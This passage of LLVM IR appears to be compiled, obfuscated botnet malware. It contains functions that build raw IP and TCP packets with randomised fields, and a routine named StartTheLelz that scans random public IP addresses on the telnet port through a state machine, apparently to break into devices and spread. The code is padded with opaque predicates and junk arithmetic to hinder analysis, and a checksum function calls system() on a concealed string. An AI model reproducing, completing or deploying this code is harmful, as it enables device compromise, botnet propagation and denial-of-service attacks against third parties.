  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %22

; <label>:50:                                     ; preds = %22
  %51 = load i32, i32* %12, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %60

; <label>:53:                                     ; preds = %50
  %54 = load i16*, i16** %11, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %13, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %13, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %50
  br label %61

; <label>:61:                                     ; preds = %65, %60
  %62 = load i64, i64* %13, align 8
  %63 = lshr i64 %62, 16
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %71

; <label>:65:                                     ; preds = %61
  %66 = load i64, i64* %13, align 8
  %67 = and i64 %66, 65535
  %68 = load i64, i64* %13, align 8
  %69 = lshr i64 %68, 16
  %70 = add i64 %67, %69
  store i64 %70, i64* %13, align 8
  br label %61

; <label>:71:                                     ; preds = %61
  %72 = load i64, i64* %13, align 8
  %73 = xor i64 %72, -1
  %74 = trunc i64 %73 to i16
  ret i16 %74

originalBBalteredBB:                              ; preds = %originalBB, %2
  %75 = alloca i16*, align 8
  %76 = alloca i32, align 4
  %77 = alloca i64, align 8
  store i16* %0, i16** %75, align 8
  store i32 %1, i32* %76, align 4
  store i64 0, i64* %77, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %78 = load i16*, i16** %11, align 8
  %79 = getelementptr inbounds i16, i16* %78, i32 1
  store i16* %79, i16** %11, align 8
  %80 = load i16, i16* %78, align 2
  %81 = zext i16 %80 to i64
  %82 = load i64, i64* %13, align 8
  %_ = shl i64 %82, %81
  %83 = add i64 %82, %81
  store i64 %83, i64* %13, align 8
  %84 = load i32, i32* %12, align 4
  %_2 = sub i32 0, %84
  %gen = add i32 %_2, 2
  %_3 = sub i32 %84, 2
  %gen4 = mul i32 %_3, 2
  %_5 = sub i32 %84, 2
  %gen6 = mul i32 %_5, 2
  %_7 = sub i32 0, %84
  %gen8 = add i32 %_7, 2
  %_9 = sub i32 %84, 2
  %gen10 = mul i32 %_9, 2
  %_11 = sub i32 0, %84
  %gen12 = add i32 %_11, 2
  %_13 = shl i32 %84, 2
  %85 = sub nsw i32 %84, 2
  store i32 %85, i32* %12, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = load i32, i32* @x.57
  %4 = load i32, i32* @y.58
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i32 0, i32 0))
  %51 = load i16*, i16** %16, align 8
  %52 = bitcast i16* %51 to i8*
  call void @free(i8* %52) #2
  %53 = load i16, i16* %17, align 2
  %54 = load i32, i32* @x.57
  %55 = load i32, i32* @y.58
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %53

originalBBalteredBB:                              ; preds = %originalBB, %2
  %62 = alloca %struct.iphdr*, align 8
  %63 = alloca %struct.tcphdr*, align 8
  %64 = alloca %struct.tcp_pseudo, align 8
  %65 = alloca i16, align 2
  %66 = alloca i32, align 4
  %67 = alloca i16*, align 8
  %68 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %62, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %63, align 8
  %69 = load %struct.iphdr*, %struct.iphdr** %62, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 2
  %71 = load i16, i16* %70, align 2
  store i16 %71, i16* %65, align 2
  %72 = load %struct.iphdr*, %struct.iphdr** %62, align 8
  %73 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %72, i32 0, i32 8
  %74 = load i32, i32* %73, align 4
  %75 = zext i32 %74 to i64
  %76 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %64, i32 0, i32 0
  store i64 %75, i64* %76, align 8
  %77 = load %struct.iphdr*, %struct.iphdr** %62, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 9
  %79 = load i32, i32* %78, align 4
  %80 = zext i32 %79 to i64
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %64, i32 0, i32 1
  store i64 %80, i64* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %64, i32 0, i32 2
  store i8 0, i8* %82, align 8
  %83 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %64, i32 0, i32 3
  store i8 6, i8* %83, align 1
  %84 = call zeroext i16 @htons(i16 zeroext 20) #13
  %85 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %64, i32 0, i32 4
  store i16 %84, i16* %85, align 2
  store i32 44, i32* %66, align 4
  %86 = load i32, i32* %66, align 4
  %87 = sext i32 %86 to i64
  %88 = call noalias i8* @malloc(i64 %87) #2
  %89 = bitcast i8* %88 to i16*
  store i16* %89, i16** %67, align 8
  %90 = load i16*, i16** %67, align 8
  %91 = bitcast i16* %90 to i8*
  %92 = bitcast %struct.tcp_pseudo* %64 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %91, i8* %92, i64 24, i32 1, i1 false)
  %93 = load i16*, i16** %67, align 8
  %94 = bitcast i16* %93 to i8*
  %95 = getelementptr inbounds i8, i8* %94, i64 24
  %96 = load %struct.tcphdr*, %struct.tcphdr** %63, align 8
  %97 = bitcast %struct.tcphdr* %96 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %95, i8* %97, i64 20, i32 1, i1 false)
  %98 = load i16*, i16** %67, align 8
  %99 = load i32, i32* %66, align 4
  %100 = call zeroext i16 @csum(i16* %98, i32 %99)
  store i16 %100, i16* %68, align 2
  %101 = call i32 @system(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.74, i32 0, i32 0))
  %102 = load i16*, i16** %67, align 8
  %103 = bitcast i16* %102 to i8*
  call void @free(i8* %103) #2
  %104 = load i16, i16* %68, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = load i32, i32* @x.59
  %7 = load i32, i32* @y.60
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca %struct.iphdr*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %14, align 8
  store i32 %1, i32* %15, align 4
  store i32 %2, i32* %16, align 4
  store i8 %3, i8* %17, align 1
  store i32 %4, i32* %18, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %20 = bitcast %struct.iphdr* %19 to i8*
  %21 = load i8, i8* %20, align 4
  %22 = and i8 %21, -16
  %23 = or i8 %22, 5
  store i8 %23, i8* %20, align 4
  %24 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %25 = bitcast %struct.iphdr* %24 to i8*
  %26 = load i8, i8* %25, align 4
  %27 = and i8 %26, 15
  %28 = or i8 %27, 64
  store i8 %28, i8* %25, align 4
  %29 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %30 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %29, i32 0, i32 1
  store i8 0, i8* %30, align 1
  %31 = load i32, i32* %18, align 4
  %32 = sext i32 %31 to i64
  %33 = add i64 20, %32
  %34 = trunc i64 %33 to i16
  %35 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 2
  store i16 %34, i16* %36, align 2
  %37 = call i32 @rand_cmwc()
  %38 = trunc i32 %37 to i16
  %39 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 3
  store i16 %38, i16* %40, align 4
  %41 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 4
  store i16 0, i16* %42, align 2
  %43 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 5
  store i8 -1, i8* %44, align 4
  %45 = load i8, i8* %17, align 1
  %46 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 6
  store i8 %45, i8* %47, align 1
  %48 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %48, i32 0, i32 7
  store i16 0, i16* %49, align 2
  %50 = load i32, i32* %16, align 4
  %51 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 8
  store i32 %50, i32* %52, align 4
  %53 = load i32, i32* %15, align 4
  %54 = load %struct.iphdr*, %struct.iphdr** %14, align 8
  %55 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %54, i32 0, i32 9
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @x.59
  %57 = load i32, i32* @y.60
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %64 = alloca %struct.iphdr*, align 8
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  %67 = alloca i8, align 1
  %68 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %64, align 8
  store i32 %1, i32* %65, align 4
  store i32 %2, i32* %66, align 4
  store i8 %3, i8* %67, align 1
  store i32 %4, i32* %68, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %70 = bitcast %struct.iphdr* %69 to i8*
  %71 = load i8, i8* %70, align 4
  %_ = sub i8 0, %71
  %gen = add i8 %_, -16
  %_1 = sub i8 %71, -16
  %gen2 = mul i8 %_1, -16
  %_3 = sub i8 0, %71
  %gen4 = add i8 %_3, -16
  %_5 = sub i8 0, %71
  %gen6 = add i8 %_5, -16
  %_7 = shl i8 %71, -16
  %_8 = shl i8 %71, -16
  %_9 = shl i8 %71, -16
  %72 = and i8 %71, -16
  %_10 = sub i8 %72, 5
  %gen11 = mul i8 %_10, 5
  %_12 = shl i8 %72, 5
  %_13 = shl i8 %72, 5
  %73 = or i8 %72, 5
  store i8 %73, i8* %70, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %75 = bitcast %struct.iphdr* %74 to i8*
  %76 = load i8, i8* %75, align 4
  %_14 = sub i8 0, %76
  %gen15 = add i8 %_14, 15
  %_16 = shl i8 %76, 15
  %77 = and i8 %76, 15
  %_17 = sub i8 0, %77
  %gen18 = add i8 %_17, 64
  %_19 = shl i8 %77, 64
  %_20 = sub i8 0, %77
  %gen21 = add i8 %_20, 64
  %_22 = shl i8 %77, 64
  %_23 = sub i8 %77, 64
  %gen24 = mul i8 %_23, 64
  %_25 = shl i8 %77, 64
  %_26 = shl i8 %77, 64
  %78 = or i8 %77, 64
  store i8 %78, i8* %75, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 1
  store i8 0, i8* %80, align 1
  %81 = load i32, i32* %68, align 4
  %82 = sext i32 %81 to i64
  %_27 = sub i64 0, 20
  %gen28 = add i64 %_27, %82
  %83 = add i64 20, %82
  %84 = trunc i64 %83 to i16
  %85 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i32 0, i32 2
  store i16 %84, i16* %86, align 2
  %87 = call i32 @rand_cmwc()
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 -1, i8* %94, align 4
  %95 = load i8, i8* %67, align 1
  %96 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %97 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %96, i32 0, i32 6
  store i8 %95, i8* %97, align 1
  %98 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %99 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %98, i32 0, i32 7
  store i16 0, i16* %99, align 2
  %100 = load i32, i32* %66, align 4
  %101 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = load i32, i32* %65, align 4
  %104 = load %struct.iphdr*, %struct.iphdr** %64, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 9
  store i32 %103, i32* %105, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %38

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* @x.63
  %22 = load i32, i32* @y.64
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %1, align 4
  %30 = load i32, i32* @x.63
  %31 = load i32, i32* @y.64
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %19
  %39 = phi i32 [ 512, %19 ], [ %29, %originalBBpart2 ]
  store i32 %39, i32* %1, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #13
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %1, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %9, align 8
  %48 = alloca %struct.telstate_t, i64 %46, align 16
  %49 = bitcast %struct.telstate_t* %48 to i8*
  %50 = load i32, i32* %1, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %38
  %54 = load i32, i32* %2, align 4
  %55 = load i32, i32* %1, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %2, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = call noalias i8* @malloc(i64 1024) #2
  %63 = load i32, i32* %2, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 8
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %2, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 8
  %71 = load i8*, i8** %70, align 8
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 1024, i32 1, i1 false)
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %2, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %2, align 4
  br label %53

; <label>:75:                                     ; preds = %53
  %76 = load i32, i32* @x.63
  %77 = load i32, i32* @y.64
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %85, align 8
  %86 = load i32, i32* @x.63
  %87 = load i32, i32* @y.64
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %94

; <label>:94:                                     ; preds = %originalBBpart2132, %originalBBpart24
  br label %95

; <label>:95:                                     ; preds = %94
  store i32 0, i32* %2, align 4
  br label %96

; <label>:96:                                     ; preds = %1548, %95
  %97 = load i32, i32* @x.63
  %98 = load i32, i32* @y.64
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* %2, align 4
  %106 = load i32, i32* %1, align 4
  %107 = icmp slt i32 %105, %106
  %108 = load i32, i32* @x.63
  %109 = load i32, i32* @y.64
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %107, label %116, label %1551

; <label>:116:                                    ; preds = %originalBBpart28
  %117 = load i32, i32* %2, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %118
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %119, i32 0, i32 2
  %121 = load i8, i8* %120, align 8
  %122 = zext i8 %121 to i32
  switch i32 %122, label %1531 [
    i32 0, label %123
    i32 1, label %360
    i32 2, label %564
    i32 3, label %696
    i32 4, label %812
    i32 5, label %1042
    i32 6, label %1158
    i32 7, label %1334
    i32 8, label %1378
  ]

; <label>:123:                                    ; preds = %116
  %124 = load i32, i32* @x.63
  %125 = load i32, i32* @y.64
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %123
  %132 = load i32, i32* %2, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %133
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %134, i32 0, i32 8
  %136 = load i8*, i8** %135, align 8
  call void @llvm.memset.p0i8.i64(i8* %136, i8 0, i64 1024, i32 1, i1 false)
  %137 = load i32, i32* %2, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %138
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %139, i32 0, i32 3
  %141 = load i8, i8* %140, align 1
  %142 = icmp ne i8 %141, 0
  %143 = load i32, i32* @x.63
  %144 = load i32, i32* @y.64
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %142, label %151, label %187

; <label>:151:                                    ; preds = %originalBBpart212
  %152 = load i32, i32* @x.63
  %153 = load i32, i32* @y.64
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %151
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 8
  %164 = load i8*, i8** %163, align 8
  store i8* %164, i8** %11, align 8
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %166
  %168 = bitcast %struct.telstate_t* %167 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 32, i32 16, i1 false)
  %169 = load i8*, i8** %11, align 8
  %170 = load i32, i32* %2, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 8
  store i8* %169, i8** %173, align 8
  %174 = call i32 @getRandomPublicIP()
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 1
  store i32 %174, i32* %178, align 4
  %179 = load i32, i32* @x.63
  %180 = load i32, i32* @y.64
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %226

; <label>:187:                                    ; preds = %originalBBpart212
  %188 = load i32, i32* %2, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %189
  %191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %190, i32 0, i32 5
  %192 = load i8, i8* %191, align 1
  %193 = add i8 %192, 1
  store i8 %193, i8* %191, align 1
  %194 = load i32, i32* %2, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 5
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i64
  %200 = icmp eq i64 %199, 26
